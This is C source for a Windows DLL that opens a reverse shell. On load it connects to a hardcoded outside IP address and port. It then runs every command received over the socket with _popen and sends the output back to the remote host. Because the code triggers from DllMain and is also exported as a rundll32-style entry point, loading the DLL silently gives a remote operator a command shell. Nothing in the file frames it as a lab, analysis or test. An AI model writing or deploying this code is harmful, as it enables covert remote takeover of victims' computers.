#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

__declspec(dllexport) void CALLBACK ReverseShell(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    struct hostent *he;
    char *domain = "3.7.100.109";
    int port = 57588;
    char buffer[1024];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    he = gethostbyname(domain);
    if (he == NULL) {
        WSACleanup();
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    while (1) {
        int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) break;
        buffer[len] = '\0';
        
        FILE *fp;
        fp = _popen(buffer, "r");
        if (fp == NULL) continue;

        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(sock, buffer, strlen(buffer), 0);
        }

        fclose(fp);
    }

    closesocket(sock);
    WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        ReverseShell(NULL, hModule, NULL, SW_SHOWNORMAL);
    }
    return TRUE;
}
